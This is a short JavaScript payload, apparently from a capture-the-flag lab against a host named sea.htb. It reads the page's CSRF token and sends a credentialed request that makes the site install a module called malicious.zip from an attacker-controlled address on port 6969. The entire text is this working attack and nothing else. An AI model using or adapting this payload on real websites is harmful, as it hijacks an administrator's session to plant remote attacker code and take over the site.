var token =
document.querySelectorAll('[name="token"]')[0].value;
var module_url =
"http://sea.htb/?installModule=http://10.10.14.69:6969/malicious.zip&directoryName=pwned&type=themes&token="
+ token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", module_url);
xhr.send();